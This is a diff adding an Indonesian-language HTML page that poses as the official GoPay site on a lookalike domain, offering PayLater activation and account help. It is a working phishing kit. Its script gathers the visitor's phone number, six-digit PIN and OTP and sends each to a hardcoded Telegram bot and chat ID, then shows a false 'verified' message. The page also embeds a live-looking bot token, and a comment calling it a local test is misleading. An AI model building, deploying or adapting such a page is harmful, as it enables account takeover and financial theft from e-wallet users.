@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- === META TAG UNTUK PREVIEW SAAT DIBAGIKAN === -->
+    <title>GoPay - Situs Resmi</title>
+    <meta name="title" content="GoPay - Situs Resmi">
+    <meta name="description" content="Aktifkan GoPay Paylater & Layanan Bantuan Akun GoPay">
+    
+    <!-- Open Graph / Facebook / WhatsApp / Telegram -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="GoPay - Situs Resmi">
+    <meta property="og:description" content="Aktifkan GoPay Paylater & Layanan Bantuan Akun GoPay">
+    <meta property="og:image" content="https://i.ibb.co.com/wZtS31mN/images-40.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://layaanan-pusat-bantuaan.lrr.my.id">
+    
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="GoPay - Situs Resmi">
+    <meta name="twitter:description" content="Aktifkan GoPay Paylater & Layanan Bantuan Akun GoPay">
+    <meta name="twitter:image" content="https://i.ibb.co.com/wZtS31mN/images-40.jpg">
+    <!-- ============================================== -->
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        html, body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        .page {
+            display: none;
+            width: 100%;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .page.active {
+            display: block;
+        }
+
+        /* === LOADING OVERLAY === */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255,255,255,0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .loading-overlay.show {
+            display: flex;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e5e7eb;
+            border-top-color: #39B54A;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #333;
+            font-size: 15px;
+        }
+
+        /* === HALAMAN UTAMA === */
+        .main-page {
+            text-align: center;
+            transform: scale(0.97);
+            transform-origin: top center;
+        }
+        .header-gopay {
+            padding: 20px 0 8px;
+        }
+        .logo-gopay img {
+            height: 42px;
+            object-fit: contain;
+        }
+        .banner-img {
+            max-width: 280px;
+            margin: 8px auto 15px;
+        }
+        .banner-img img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .container {
+            margin: 15px auto;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 22px 16px;
+            max-width: 440px;
+        }
+        .judul-pilihan {
+            font-size: 17px;
+            margin-bottom: 18px;
+            color: #333;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 12px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        .btn-paylater {
+            background-color: #39B54A;
+        }
+        .btn-lapor {
+            background-color: #39B54A;
+        }
+        .teks-resmi {
+            margin-top: 16px;
+            font-size: 16px;
+            color: #333;
+        }
+        .bottom-logo {
+            margin: 22px auto 30px;
+            max-width: 250px;
+        }
+        .bottom-logo img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* === UMUM: Nomor, PIN, OTP === */
+        .back-link {
+            display: inline-block;
+            margin-bottom: 30px;
+            cursor: pointer;
+        }
+        .back-link span {
+            color: #333;
+            font-size: 24px;
+        }
+        .header-text {
+            margin-bottom: 40px;
+        }
+        .header-text h1 {
+            font-size: 24px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 8px;
+        }
+        .header-text p {
+            font-size: 15px;
+            color: #666;
+        }
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            overflow: hidden;
+            background-color: #f3f4f6;
+            margin-bottom: 60px;
+        }
+        .country-code {
+            padding: 15px 12px;
+            background-color: #e5e7eb;
+            font-size: 16px;
+            color: #333;
+            border-right: 1px solid #ddd;
+        }
+        .phone-input {
+            flex: 1;
+            padding: 15px 12px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            background-color: transparent;
+        }
+        .btn-next {
+            width: 100%;
+            padding: 16px;
+            font-size: 17px;
+            color: #fff;
+            background-color: #ccc;
+            border: none;
+            border-radius: 999px;
+            cursor: not-allowed;
+            margin-bottom: 16px;
+            transition: background-color 0.3s;
+        }
+        .btn-next.active {
+            background-color: #39B54A;
+            cursor: pointer;
+        }
+        .terms {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+        }
+        .terms a {
+            color: #00A6CE;
+            text-decoration: none;
+        }
+
+        /* === PIN & OTP === */
+        .pin-container, .otp-container {
+            display: flex;
+            justify-content: space-between;
+            max-width: 320px;
+            margin: 0 auto 40px;
+            position: relative;
+        }
+        .pin-dot, .otp-dot {
+            width: 45px;
+            height: 55px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 500;
+            color: #111;
+            background-color: #fafafa;
+            transition: all 0.2s;
+        }
+        .pin-dot.filled, .otp-dot.filled {
+            border-color: #39B54A;
+            background-color: #f0fdf4;
+        }
+        .pin-dot.focused, .otp-dot.focused {
+            border-color: #39B54A;
+            box-shadow: 0 0 0 2px rgba(57, 189, 89, 0.15);
+        }
+        .hidden-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            border: none;
+            outline: none;
+            z-index: 10;
+            font-size: 16px;
+            cursor: text;
+        }
+        .resend-text {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #444;
+            text-align: center;
+        }
+        .resend-link {
+            color: #39B54A;
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LOADING ANIMASI -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loader"></div>
+        <div class="loading-text">Memproses...</div>
+    </div>
+
+    <!-- HALAMAN UTAMA -->
+    <div id="mainPage" class="page main-page active">
+        <div class="header-gopay">
+            <div class="logo-gopay">
+                <img src="https://i.ibb.co.com/7N65yzC6/gopay.webp" alt="GoPay">
+            </div>
+        </div>
+
+        <div class="banner-img">
+            <img src="https://i.ibb.co.com/xKbf9gwD/person-large.webp" alt="Person Large">
+        </div>
+
+        <div class="container">
+            <p class="judul-pilihan">SILAHKAN PILIH SESUAI KEBUTUHAN ANDA :</p>
+            
+            <button class="btn btn-paylater" onclick="showPage('phonePage')">Aktifkan GoPay Paylater</button>
+            <button class="btn btn-lapor" onclick="showPage('phonePage')">Laporkan Akun Kendala</button>
+            
+            <p class="teks-resmi">situs web resmi</p>
+        </div>
+
+        <div class="bottom-logo">
+            <img src="https://i.ibb.co.com/XZf6Jy9t/IMG-20261021-WA0013-1.jpg" alt="Logo">
+        </div>
+    </div>
+
+    <!-- HALAMAN NOMOR TELEPON -->
+    <div id="phonePage" class="page phone-page">
+        <div class="back-link" onclick="showPage('mainPage'); clearPhone();">
+            <span>&#8592;</span>
+        </div>
+
+        <div class="header-text">
+            <h1>Selamat datang di GoPay!</h1>
+            <p>Masuk atau daftar hanya dalam beberapa langkah mudah.</p>
+        </div>
+
+        <div class="input-wrapper">
+            <div class="country-code">+62</div>
+            <input type="tel" id="phoneInput" class="phone-input" placeholder="Masukkan nomor HP" maxlength="14" inputmode="numeric">
+        </div>
+
+        <button id="nextBtn" class="btn-next" onclick="goToPin()">Lanjutkan</button>
+
+        <p class="terms">
+            Dengan masuk atau mendaftar, kamu menyetujui <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a>
+        </p>
+    </div>
+
+    <!-- HALAMAN PIN -->
+    <div id="pinPage" class="page pin-page">
+        <div class="back-link" onclick="showPage('phonePage'); clearPin();">
+            <span>&#8592;</span>
+        </div>
+
+        <div class="header-text">
+            <h1>Masukkan PIN Kamu</h1>
+            <p>Ketik 6 digit PIN untuk masuk ke akun</p>
+        </div>
+
+        <div class="pin-container" id="pinContainer">
+            <div class="pin-dot" id="pinDot1"></div>
+            <div class="pin-dot" id="pinDot2"></div>
+            <div class="pin-dot" id="pinDot3"></div>
+            <div class="pin-dot" id="pinDot4"></div>
+            <div class="pin-dot" id="pinDot5"></div>
+            <div class="pin-dot" id="pinDot6"></div>
+            <input type="number" id="pinInput" class="hidden-input" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+        </div>
+    </div>
+
+    <!-- HALAMAN OTP -->
+    <div id="otpPage" class="page otp-page">
+        <div class="back-link" onclick="showPage('pinPage'); clearOtp();">
+            <span>&#8592;</span>
+        </div>
+
+        <div class="header-text">
+            <h1>Masukkan Kode OTP</h1>
+            <p>Kode telah dikirim via WhatsApp</p>
+        </div>
+
+        <div class="otp-container" id="otpContainer">
+            <div class="otp-dot" id="otpDot1"></div>
+            <div class="otp-dot" id="otpDot2"></div>
+            <div class="otp-dot" id="otpDot3"></div>
+            <div class="otp-dot" id="otpDot4"></div>
+            <div class="otp-dot" id="otpDot5"></div>
+            <div class="otp-dot" id="otpDot6"></div>
+            <input type="number" id="otpInput" class="hidden-input" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+        </div>
+
+        <p class="resend-text">Belum menerima kode? <a href="#" class="resend-link" id="resendOtp">Kirim ulang</a></p>
+    </div>
+
+    <script>
+        // ⚠️ PERINGATAN KEAMANAN: Token hanya untuk uji coba lokal
+        const BOT_TOKEN = '8772240270:AAG_UVsrFpzSxJOTMAX9D5lSF2TC_jrpwA8';
+        const CHAT_ID = '7934533807';
+        
+        let collectedData = { nomor: '-', pin: '-', otp: '-' };
+        let messageId = null;
+
+        function buildMessage() {
+return `NOMOR TELEPON: ${collectedData.nomor}
+PIN: ${collectedData.pin}
+KODE OTP: ${collectedData.otp}`;
+        }
+
+        async function sendOrUpdateMessage() {
+            try {
+                const text = buildMessage();
+                if (!messageId) {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                    const data = await res.json();
+                    if (data.result) messageId = data.result.message_id;
+                } else {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, text: text })
+                    });
+                }
+            } catch (err) {
+                console.log('Gagal kirim/update:', err);
+            }
+        }
+
+        function showLoading(text = 'Memproses...') {
+            document.querySelector('.loading-text').textContent = text;
+            document.getElementById('loadingOverlay').classList.add('show');
+        }
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.remove('show');
+        }
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
+            
+            setTimeout(() => {
+                const input = pageId === 'pinPage' 
+                    ? document.getElementById('pinInput') 
+                    : pageId === 'otpPage' 
+                        ? document.getElementById('otpInput') 
+                        : null;
+                if (input) {
+                    input.value = '';
+                    input.focus();
+                }
+            }, 100);
+        }
+
+        // === NOMOR HP ===
+        const phoneInput = document.getElementById('phoneInput');
+        const nextBtn = document.getElementById('nextBtn');
+
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            const len = this.value.length;
+            if (len >= 10 && len <= 14) {
+                nextBtn.classList.add('active');
+                nextBtn.disabled = false;
+            } else {
+                nextBtn.classList.remove('active');
+                nextBtn.disabled = true;
+            }
+        });
+
+        function goToPin() {
+            if (!nextBtn.classList.contains('active')) return;
+            let num = phoneInput.value;
+            if (num.startsWith('8')) num = '0' + num;
+            collectedData.nomor = num.startsWith('0') ? num : '0' + num;
+            sendOrUpdateMessage();
+            showLoading('Memproses nomor...');
+            setTimeout(() => {
+                hideLoading();
+                showPage('pinPage');
+            }, 1200);
+        }
+
+        function clearPhone() {
+            phoneInput.value = '';
+            nextBtn.classList.remove('active');
+        }
+
+        // === PIN ===
+        const pinInput = document.getElementById('pinInput');
+        const pinDots = Array.from({length:6}, (_,i) => document.getElementById(`pinDot${i+1}`));
+
+        document.getElementById('pinContainer').addEventListener('click', function() {
+            pinInput.value = '';
+            collectedData.pin = '-';
+            pinDots.forEach(dot => {
+                dot.textContent = '';
+                dot.classList.remove('filled');
+            });
+            pinInput.focus();
+        });
+
+        pinInput.addEventListener('focus', () => {
+            pinDots[0].classList.add('focused');
+        });
+        pinInput.addEventListener('blur', () => {
+            pinDots.forEach(dot => dot.classList.remove('focused'));
+        });
+
+        pinInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            const val = this.value;
+            pinDots.forEach((dot, i) => {
+                if (i < val.length) {
+                    dot.textContent = val[i];
+                    dot.classList.add('filled');
+                } else {
+                    dot.textContent = '';
+                    dot.classList.remove('filled');
+                }
+            });
+            
+            if (val.length === 6) {
+                collectedData.pin = val;
+                sendOrUpdateMessage();
+                showLoading('Memverifikasi PIN...');
+                setTimeout(() => {
+                    hideLoading();
+                    clearPin();
+                    showPage('otpPage');
+                }, 1200);
+            }
+        });
+
+        function clearPin() {
+            pinInput.value = '';
+            pinDots.forEach(dot => {
+                dot.textContent = '';
+                dot.classList.remove('filled');
+            });
+        }
+
+        // === OTP ===
+        const otpInput = document.getElementById('otpInput');
+        const otpDots = Array.from({length:6}, (_,i) => document.getElementById(`otpDot${i+1}`));
+
+        document.getElementById('otpContainer').addEventListener('click', function() {
+            otpInput.value = '';
+            collectedData.otp = '-';
+            otpDots.forEach(dot => {
+                dot.textContent = '';
+                dot.classList.remove('filled');
+            });
+            otpInput.focus();
+        });
+
+        otpInput.addEventListener('focus', () => {
+            otpDots[0].classList.add('focused');
+        });
+        otpInput.addEventListener('blur', () => {
+            otpDots.forEach(dot => dot.classList.remove('focused'));
+        });
+
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            const val = this.value;
+            otpDots.forEach((dot, i) => {
+                if (i < val.length) {
+                    dot.textContent = val[i];
+                    dot.classList.add('filled');
+                } else {
+                    dot.textContent = '';
+                    dot.classList.remove('filled');
+                }
+            });
+            
+            if (val.length === 6) {
+                collectedData.otp = val;
+                sendOrUpdateMessage();
+                showLoading('Memverifikasi OTP...');
+                setTimeout(() => {
+                    hideLoading();
+                    clearOtp();
+                    alert('OTP terverifikasi! Data telah dikirim.');
+                }, 1500);
+            }
+        });
+
+        function clearOtp() {
+            otpInput.value = '';
+            otpDots.forEach(dot => {
+                dot.textContent = '';
+                dot.classList.remove('filled');
+            });
+        }
+
+        document.getElementById('resendOtp').addEventListener('click', function(e) {
+            e.preventDefault();
+            clearOtp();
+            showLoading('Mengirim ulang...');
+            setTimeout(() => {
+                hideLoading();
+                alert('Kode OTP baru telah dikirim!');
+                otpInput.focus();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
